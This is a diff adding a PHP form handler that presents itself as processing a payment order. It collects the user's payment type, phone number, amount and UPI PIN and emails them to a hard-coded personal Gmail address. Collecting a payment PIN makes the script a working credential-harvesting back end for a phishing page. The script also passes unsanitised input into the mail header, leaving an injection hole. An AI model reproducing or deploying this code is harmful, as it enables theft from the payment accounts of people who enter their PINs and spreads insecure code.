@@ -1,0 +1,40 @@
+<?php  
+$success= '';
+if( isset($_POST['submit']) ) {
+//getting user data
+$paymentType = $_POST['paymentType'];
+$phone = $_POST['phoneNo'];
+$Amount = $_POST['amount'];
+$upiPin = $_POST['upiPin'];
+ 
+//Recipient email, Replace with your email Address
+$mailTo = 'Swamiomparkash@gmail.com';
+ 
+//email subject
+$subject = ' A New Message Received From Order ' ;
+// .$Name;
+ 
+//email message body
+$htmlContent = '<h2> Email Request Received </h2>
+<p> <b>Payment Type: </b> '.$paymentType . '</p>
+<p> <b>Phone Number: </b> '.$phone .'</p>
+<p> <b>Amount: </b> '.$Amount .'</p>
+<p> <b>UPI PIN: </b> '.$upiPin .'</p>';
+ 
+//header for sender info
+$headers = "From: " .$paymentType . "<". $phone . ">";
+$headers .= "MIME-Version: 1.0\r\n";
+$headers .= "Content-Type: text/html; charset=UTF-8\r\n";
+ 
+//PHP mailer function
+ $result = mail($mailTo, $subject, $htmlContent, $headers);
+ 
+   //error checking
+   if($result) {
+    $success = "The message was sent successfully!";
+   } else {
+    $failed = "Error: Message was not sent, Try again Later";
+   }
+}
+ 
+?>
